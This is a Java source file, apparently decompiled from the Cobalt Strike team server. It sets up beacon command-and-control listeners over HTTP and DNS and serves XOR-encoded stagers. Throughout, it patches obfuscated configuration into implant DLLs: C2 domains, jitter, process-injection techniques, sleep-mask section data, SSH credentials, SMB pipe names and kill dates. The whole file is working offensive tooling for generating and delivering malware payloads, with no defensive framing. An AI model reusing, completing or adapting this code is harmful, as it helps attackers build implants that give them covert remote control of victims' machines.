package beacon;

import c2profile.MalleableHook;
import c2profile.MalleableStager;
import c2profile.Profile;
import cloudstrike.WebServer;
import common.*;
import dns.AsymmetricCrypto;
import dns.DNSServer;
import dns.QuickSecurity;
import graph.Route;
import pe.MalleablePE;
import pe.PEParser;
import server.Resources;
import server.ServerUtils;
import server.WebCalls;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.security.KeyPair;
import java.util.HashMap;
import java.util.LinkedList;
import java.util.Map;

public class BeaconSetup {
    public static final int SETTING_PROTOCOL = 1;
    public static final int SETTING_PORT = 2;
    public static final int SETTING_SLEEPTIME = 3;
    public static final int SETTING_MAXGET = 4;
    public static final int SETTING_JITTER = 5;
    public static final int SETTING_MAXDNS = 6;
    public static final int SETTING_PUBKEY = 7;
    public static final int SETTING_DOMAINS = 8;
    public static final int SETTING_USERAGENT = 9;
    public static final int SETTING_SUBMITURI = 10;
    public static final int SETTING_C2_RECOVER = 11;
    public static final int SETTING_C2_REQUEST = 12;
    public static final int SETTING_C2_POSTREQ = 13;
    public static final int DEPRECATED_SETTING_SPAWNTO = 14;
    public static final int SETTING_PIPENAME = 15;
    public static final int DEPRECATED_SETTING_KILLDATE_YEAR = 16;
    public static final int DEPRECATED_SETTING_KILLDATE_MONTH = 17;
    public static final int DEPRECATED_SETTING_KILLDATE_DAY = 18;
    public static final int SETTING_DNS_IDLE = 19;
    public static final int SETTING_DNS_SLEEP = 20;
    public static final int SETTING_SSH_HOST = 21;
    public static final int SETTING_SSH_PORT = 22;
    public static final int SETTING_SSH_USERNAME = 23;
    public static final int SETTING_SSH_PASSWORD = 24;
    public static final int SETTING_SSH_KEY = 25;
    public static final int SETTING_C2_VERB_GET = 26;
    public static final int SETTING_C2_VERB_POST = 27;
    public static final int SETTING_C2_CHUNK_POST = 28;
    public static final int SETTING_SPAWNTO_X86 = 29;
    public static final int SETTING_SPAWNTO_X64 = 30;
    public static final int SETTING_CRYPTO_SCHEME = 31;
    public static final int SETTING_PROXY_CONFIG = 32;
    public static final int SETTING_PROXY_USER = 33;
    public static final int SETTING_PROXY_PASSWORD = 34;
    public static final int SETTING_PROXY_BEHAVIOR = 35;
    public static final int DEPRECATED_SETTING_INJECT_OPTIONS = 36;
    public static final int SETTING_WATERMARK = 37;
    public static final int SETTING_CLEANUP = 38;
    public static final int SETTING_CFG_CAUTION = 39;
    public static final int SETTING_KILLDATE = 40;
    public static final int SETTING_GARGLE_NOOK = 41;
    public static final int SETTING_GARGLE_SECTIONS = 42;
    public static final int SETTING_PROCINJ_PERMS_I = 43;
    public static final int SETTING_PROCINJ_PERMS = 44;
    public static final int SETTING_PROCINJ_MINALLOC = 45;
    public static final int SETTING_PROCINJ_TRANSFORM_X86 = 46;
    public static final int SETTING_PROCINJ_TRANSFORM_X64 = 47;
    public static final int SETTING_PROCINJ_ALLOWED = 48;
    protected WebCalls web;
    protected DNSServer dns = null;
    protected Profile c2profile;
    protected BeaconC2 handlers;
    protected BeaconData data = new BeaconData();
    protected String error = "";
    protected Resources resources;
    protected Map c2info = null;
    protected MalleablePE pe;

    public BeaconSetup(Resources resources) {
        this.resources = resources;
        this.web = ServerUtils.getWebCalls(resources);
        this.c2profile = ServerUtils.getProfile(resources);
        this.pe = new MalleablePE(this.c2profile);
        this.handlers = new BeaconC2(this.c2profile, this.data, resources);
    }

    public Map getC2Info(String bid) {
        HashMap<String, String> copy2 = new HashMap<String, String>(this.c2info);
        copy2.put("bid", bid);
        return copy2;
    }

    public BeaconData getData() {
        return this.data;
    }

    public BeaconC2 getHandlers() {
        return this.handlers;
    }

    public BeaconSocks getSocks() {
        return this.handlers.getSocks();
    }

    protected AsymmetricCrypto beacon_asymmetric() {
        try {
            File keys = new File(".cobaltstrike.beacon_keys");
            if (!keys.exists()) {
                CommonUtils.writeObject(keys, AsymmetricCrypto.generateKeys());
            }
            KeyPair secret = (KeyPair) CommonUtils.readObject(keys, null);
            return new AsymmetricCrypto(secret);
        } catch (Exception ex) {
            MudgeSanity.logException("generate beacon asymmetric keys", ex, false);
            return null;
        }
    }

    public void stop(int port) {
        this.web.deregister(port, "beacon.http-get");
        this.web.deregister(port, "beacon.http-post");
        this.web.deregister(port, "stager");
        this.web.deregister(port, "stager64");
    }

    public boolean start(int port, boolean wantdns, String domains, boolean ssl) {
        try {
            this.c2info = new HashMap();
            this.c2info.put("port", port);
            this.c2info.put("dns", wantdns);
            this.c2info.put("domains", domains);
            this.c2info.put("ssl", ssl);
            QuickSecurity security;
            AsymmetricCrypto asecurity;
            security = new QuickSecurity();
            asecurity = this.beacon_asymmetric();
            this.handlers.setCrypto(security, asecurity);
            if (QuickSecurity.getCryptoScheme() == 1) {
                CommonUtils.print_trial("WARNING! Beacon will not encrypt tasks or responses!");
            }
            WebServer www = ssl ? this.web.getSecureWebServer(port) : this.web.getWebServer(port);
            MalleableHook server = new MalleableHook(this.c2profile, "beacon", "beacon handler");
            server.setup(www, ".http-get", this.handlers.getGetHandler());
            server = new MalleableHook(this.c2profile, "beacon", "beacon post handler");
            server.setup(www, ".http-post", this.handlers.getPostHandler());
            if (wantdns && this.dns == null) {
                long dnsidle;
                long myip = Route.ipToLong(ServerUtils.getMyIP(this.resources));
                if (myip == (dnsidle = CommonUtils.ipToLong(this.c2profile.getString(".dns_idle")))) {
                    this.error = "Team Server IP " + ServerUtils.getMyIP(this.resources) + " conflicts with profile dns_idle value";
                    return false;
                }
                for (int x = 0; x < 6; ++x) {
                    if ((dnsidle ^ (long) (240 + x)) != myip) continue;
                    this.error = "Team Server IP " + ServerUtils.getMyIP(this.resources) + " conflicts with DNS C2 control value. Change profile dns_idle value";
                    return false;
                }
                this.dns = new DNSServer();
                this.dns.setDefaultTTL(this.c2profile.getInt(".dns_ttl"));
                this.dns.installHandler(this.handlers.getDNSHandler());
                this.dns.go();
            }
            byte[] stage = this.exportBeaconStage(port, domains, wantdns, ssl);
            byte[] httpstage = ArtifactUtils.XorEncode(stage, "x86");
            this.resources.put("BeaconStage", httpstage);
            if (this.c2profile.option(".host_stage")) {
                MalleableStager stager = new MalleableStager(this.c2profile, ".http-stager", httpstage, "x86");
                stager.setup(www, "stager");
            }
            if (wantdns) {
                String dnsstage = ArtifactUtils.AlphaEncode(stage);
                this.resources.put("BeaconDNSStage", dnsstage);
            }
            byte[] stage64 = this.exportBeaconStageX64(port, domains, wantdns, ssl);
            byte[] httpstage64 = ArtifactUtils.XorEncode(stage64, "x64");
            this.resources.put("BeaconStageX64", httpstage64);
            if (this.c2profile.option(".host_stage")) {
                MalleableStager stager64 = new MalleableStager(this.c2profile, ".http-stager", httpstage64, "x64");
                stager64.setup(www, "stager64");
            }
            this.web.broadcastSiteModel();
            return true;
        } catch (Exception ex) {
            MudgeSanity.logException("Start Beacon: " + port + " DNS: " + wantdns + " SSL: " + ssl, ex, false);
            this.error = ex.getMessage();
            return false;
        }
    }

    public String getLastError() {
        return this.error;
    }

    public static byte[] beacon_obfuscate(byte[] data) {
        byte[] result = new byte[data.length];
        for (int x = 0; x < data.length; ++x) {
            result[x] = (byte) (data[x] ^ 105);
        }
        return result;
    }

    public byte[] exportBeaconStageGeneric(int port, String domains, boolean wantdns, boolean ssl, String proxyconfig, String arch) {
        AssertUtils.TestSetValue(arch, "x86, x64");
        String file = "";
        if ("x86".equals(arch)) {
            file = "resources/beacon.dll";
        } else if ("x64".equals(arch)) {
            file = "resources/beacon.x64.dll";
        }
        return this.pe.process(this.exportBeaconStage(port, domains, wantdns, ssl, proxyconfig, file), arch);
    }

    public byte[] exportBeaconStage(int port, String domains, boolean wantdns, boolean ssl) {
        return this.exportBeaconStageGeneric(port, domains, wantdns, ssl, "", "x86");
    }

    public byte[] exportBeaconStageX64(int port, String domains, boolean wantdns, boolean ssl) {
        return this.exportBeaconStageGeneric(port, domains, wantdns, ssl, "", "x64");
    }

    protected void setupKillDate(Settings settings) {
        if (!this.c2profile.hasString(".killdate")) {
            settings.addInt(40, 0);
            return;
        }
        String killdate = this.c2profile.getString(".killdate");
        String[] parts = killdate.split("-");
        int year = (short) CommonUtils.toNumber(parts[0], 0) * 10000;
        int month = (short) CommonUtils.toNumber(parts[1], 0) * 100;
        short day = (short) CommonUtils.toNumber(parts[2], 0);
        settings.addInt(40, year + month + day);
    }

    protected void setupProcessInjectTransform(Settings settings, int field, byte[] prepend, byte[] append) {
        Packer packer = new Packer();
        packer.big();
        packer.addInt(prepend.length);
        packer.append(prepend);
        packer.addInt(append.length);
        packer.append(append);
        settings.addData(field, packer.getBytes(), 256);
    }

    protected void setupProcessInject(Settings settings) throws IOException {
        boolean createremotethread = this.c2profile.option(".process-inject.CreateRemoteThread");
        boolean setthreadcontext = this.c2profile.option(".process-inject.SetThreadContext");
        boolean rtlcreateuserthread = this.c2profile.option(".process-inject.RtlCreateUserThread");
        boolean userwx = this.c2profile.option(".process-inject.userwx");
        boolean startrwx = this.c2profile.option(".process-inject.startrwx");
        int min_alloc = this.c2profile.getInt(".process-inject.min_alloc");
        byte[] prepended_x86 = this.c2profile.getPrependedData(".process-inject.transform-x86");
        byte[] appended_x86 = this.c2profile.getAppendedData(".process-inject.transform-x86");
        byte[] prepended_x64 = this.c2profile.getPrependedData(".process-inject.transform-x64");
        byte[] appended_x64 = this.c2profile.getAppendedData(".process-inject.transform-x64");
        settings.addShort(43, startrwx ? 64 : 4);
        settings.addShort(44, userwx ? 64 : 32);
        settings.addInt(45, min_alloc);
        this.setupProcessInjectTransform(settings, 46, prepended_x86, appended_x86);
        this.setupProcessInjectTransform(settings, 47, prepended_x64, appended_x64);
        int allowed = 0;
        if (createremotethread) {
            allowed |= 1;
        }
        if (setthreadcontext) {
            allowed |= 2;
        }
        if (rtlcreateuserthread) {
            allowed |= 4;
        }
        settings.addShort(48, allowed);
    }

    protected void setupGargle(Settings settings, String file) throws IOException {
        if (!this.c2profile.option(".stage.sleep_mask")) {
            settings.addInt(41, 0);
            return;
        }
        PEParser parser = PEParser.load(CommonUtils.resource(file));
        boolean obfuscate = this.c2profile.option(".stage.obfuscate");
        boolean userwx = this.c2profile.option(".stage.userwx");
        int nook = parser.sectionEnd(".text");
        settings.addInt(41, nook);
        Packer packer = new Packer();
        packer.little();
        if (!obfuscate) {
            packer.addInt(0);
            packer.addInt(4096);
        }
        for (Object o : parser.SectionsTable()) {
            String next = (String) o;
            if (".text".equals(next) && !userwx) continue;
            packer.addInt(parser.sectionAddress(next));
            packer.addInt(parser.sectionEnd(next));
        }
        packer.addInt(0);
        packer.addInt(0);
        settings.addData(42, packer.getBytes(), (int) packer.size());
    }

    public byte[] exportBeaconStage(int port, String domains, boolean wantdns, boolean ssl, String beaconf) {
        return this.exportBeaconStage(port, domains, wantdns, ssl, "", beaconf);
    }

    public byte[] exportBeaconStage(int port, String domains, boolean wantdns, boolean ssl, String proxyconfig, String beaconf) {
        try {
            int maxdns;
            long start = System.currentTimeMillis();
            InputStream in = CommonUtils.resource(beaconf);
            byte[] data = CommonUtils.readAll(in);
            in.close();
            if (domains.length() > 254) {
                domains = domains.substring(0, 254);
            }
            String[] uriz = this.c2profile.getString(".http-get.uri").split(" ");
            String[] domainz = domains.split(",\\s*");
            LinkedList<String> urls = new LinkedList<>();
            for (String aDomainz : domainz) {
                urls.add(aDomainz);
                urls.add(CommonUtils.pick(uriz));
            }
            while (urls.size() > 2 && CommonUtils.join(urls, ",").length() > 255) {
                String u = urls.removeLast() + "";
                String d = urls.removeLast() + "";
                CommonUtils.print_info("dropping " + d + u + " from Beacon profile for size");
            }
            String ua = BeaconSetup.randua(this.c2profile);
            int st = Integer.parseInt(this.c2profile.getString(".sleeptime"));
            String submit = CommonUtils.pick(this.c2profile.getString(".http-post.uri").split(" "));
            byte[] recover = this.c2profile.recover_binary(".http-get.server.output");
            byte[] httpget = this.c2profile.apply_binary(".http-get.client");
            byte[] httppost = this.c2profile.apply_binary(".http-post.client");
            int getsize = this.c2profile.size(".http-get.server.output", 1048576);
            String spawnto = this.c2profile.getString(".spawnto");
            int djitter = Integer.parseInt(this.c2profile.getString(".jitter"));
            if (djitter < 0 || djitter > 99) {
                djitter = 0;
            }
            if ((maxdns = Integer.parseInt(this.c2profile.getString(".maxdns"))) < 0 || maxdns > 255) {
                maxdns = 255;
            }
            int proto = 0;
            if (wantdns) {
                proto |= 1;
            }
            if (ssl) {
                proto |= 8;
            }
            String pipename = "\\\\%s\\pipe\\" + CommonUtils.strrep(this.c2profile.getString(".pipename"), "##", "%x");
            long dnsidle = CommonUtils.ipToLong(this.c2profile.getString(".dns_idle"));
            int dnssleep = Integer.parseInt(this.c2profile.getString(".dns_sleep"));
            AsymmetricCrypto asecurity = this.beacon_asymmetric();
            Settings settings = new Settings();
            settings.addShort(1, proto);
            settings.addShort(2, port);
            settings.addInt(3, st);
            settings.addInt(4, getsize);
            settings.addShort(5, djitter);
            settings.addShort(6, maxdns);
            settings.addData(7, asecurity.exportPublicKey(), 256);
            settings.addString(8, CommonUtils.join(urls, ","), 256);
            settings.addString(9, ua, 128);
            settings.addString(10, submit, 64);
            settings.addData(11, recover, 256);
            settings.addData(12, httpget, 256);
            settings.addData(13, httppost, 256);
            settings.addString(29, this.c2profile.getString(".spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".spawnto_x64"), 64);
            settings.addString(15, pipename, 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            settings.addInt(19, (int) dnsidle);
            settings.addInt(20, dnssleep);
            settings.addString(26, this.c2profile.getString(".http-get.verb"), 16);
            settings.addString(27, this.c2profile.getString(".http-post.verb"), 16);
            settings.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            settings.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
            settings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
            ProxyServer proxy = ProxyServer.parse(proxyconfig);
            proxy.setup(settings);
            this.setupKillDate(settings);
            this.setupGargle(settings, beaconf);
            this.setupProcessInject(settings);
            byte[] res = settings.toPatch();
            res = BeaconSetup.beacon_obfuscate(res);
            String dataz = CommonUtils.bString(data);
            int index = dataz.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(res), index);
            this.resources.put("BeaconDLL", CommonUtils.toBytes(dataz));
            return CommonUtils.toBytes(dataz);
        } catch (IOException ioex) {
            MudgeSanity.logException("export Beacon stage: " + beaconf, ioex, false);
            return new byte[0];
        }
    }

    public byte[] exportSMBStage(String arch) {
        if (arch.equals("x64")) {
            return this.pe.process(this.exportSMBDLL("resources/beacon.x64.dll"), arch);
        }
        return this.pe.process(this.exportSMBDLL("resources/beacon.dll"), arch);
    }

    public byte[] exportSMBStage(String arch, String pname) {
        if (arch.equals("x64")) {
            return this.pe.process(this.exportSMBDLL("resources/beacon.x64.dll", pname), arch);
        }
        return this.pe.process(this.exportSMBDLL("resources/beacon.dll", pname), arch);
    }

    public byte[] exportSSHStage(String path, String arch, String host, int port, String username, String password, String pipename, boolean pubkey) {
        if (arch.equals("x64")) {
            return ReflectiveDLL.patchDOSHeaderX64(this.exportSSHDLL(path, host, port, username, password, pipename, pubkey));
        }
        return ReflectiveDLL.patchDOSHeader(this.exportSSHDLL(path, host, port, username, password, pipename, pubkey));
    }

    public byte[] exportSMBDLL() {
        return this.exportSMBDLL("resources/beacon.dll");
    }

    public byte[] exportSSHDLL(String dllpath, String host, int port, String username, String password, String pipename, boolean pubkey) {
        try {
            long start = System.currentTimeMillis();
            InputStream in = CommonUtils.resource(dllpath);
            byte[] data = CommonUtils.readAll(in);
            in.close();
            AsymmetricCrypto asecurity = this.beacon_asymmetric();
            Settings settings = new Settings();
            settings.addInt(4, 1048576);
            settings.addData(7, asecurity.exportPublicKey(), 256);
            settings.addString(29, this.c2profile.getString(".spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".spawnto_x64"), 64);
            settings.addString(15, pipename, 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            settings.addString(21, host, 256);
            settings.addShort(22, port);
            settings.addString(23, username, 128);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            if (pubkey) {
                settings.addString(25, password, 6144);
            } else {
                settings.addString(24, password, 128);
            }
            byte[] res = settings.toPatch(8192);
            res = BeaconSetup.beacon_obfuscate(res);
            String dataz = CommonUtils.bString(data);
            int index = dataz.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(res), index);
            dataz = CommonUtils.strrep(dataz, "sshagent.dll", CommonUtils.garbage("sshagent") + ".dll");
            dataz = CommonUtils.strrep(dataz, "sshagent.x64.dll", CommonUtils.garbage("sshagent") + ".x64.dll");
            return CommonUtils.toBytes(dataz);
        } catch (IOException ioex) {
            MudgeSanity.logException("export SSH DLL", ioex, false);
            return new byte[0];
        }
    }

    public byte[] exportSMBDLL(String dllpath) {
        return this.exportSMBDLL(dllpath, CommonUtils.strrep(this.c2profile.getString(".pipename"), "##", "%x"));
    }

    public byte[] exportSMBDLL(String dllpath, String pname) {
        try {
            long start = System.currentTimeMillis();
            InputStream in = CommonUtils.resource(dllpath);
            byte[] data = CommonUtils.readAll(in);
            in.close();
            String spawnto = this.c2profile.getString(".spawnto");
            AsymmetricCrypto asecurity = this.beacon_asymmetric();
            String pipename = "\\\\%s\\pipe\\" + pname;
            Settings settings = new Settings();
            settings.addShort(1, 2);
            settings.addShort(2, 4444);
            settings.addInt(3, 10000);
            settings.addInt(4, 1048576);
            settings.addShort(5, 0);
            settings.addShort(6, 0);
            settings.addData(7, asecurity.exportPublicKey(), 256);
            settings.addString(8, "", 256);
            settings.addString(9, "", 128);
            settings.addString(10, "", 64);
            settings.addString(11, "", 256);
            settings.addString(12, "", 256);
            settings.addString(13, "", 256);
            settings.addString(29, this.c2profile.getString(".spawnto_x86"), 64);
            settings.addString(30, this.c2profile.getString(".spawnto_x64"), 64);
            settings.addString(15, pipename, 128);
            settings.addShort(31, QuickSecurity.getCryptoScheme());
            this.setupKillDate(settings);
            settings.addInt(37, this.c2profile.getInt(".watermark"));
            settings.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
            settings.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
            this.setupGargle(settings, dllpath);
            this.setupProcessInject(settings);
            byte[] res = settings.toPatch();
            res = BeaconSetup.beacon_obfuscate(res);
            String dataz = CommonUtils.bString(data);
            int index = dataz.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
            dataz = CommonUtils.replaceAt(dataz, CommonUtils.bString(res), index);
            return CommonUtils.toBytes(dataz);
        } catch (IOException ioex) {
            MudgeSanity.logException("export SMB DLL", ioex, false);
            return new byte[0];
        }
    }

    public static String randua(Profile c2profile) {
        if (c2profile.getString(".useragent").equals("<RAND>")) {
            try {
                InputStream in = CommonUtils.resource("resources/ua.txt");
                String ua = CommonUtils.pick(CommonUtils.bString(CommonUtils.readAll(in)).split("\n"));
                in.close();
                return ua;
            } catch (IOException ioex) {
                MudgeSanity.logException("randua", ioex, false);
                return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";
            }
        }
        return c2profile.getString(".useragent");
    }
}

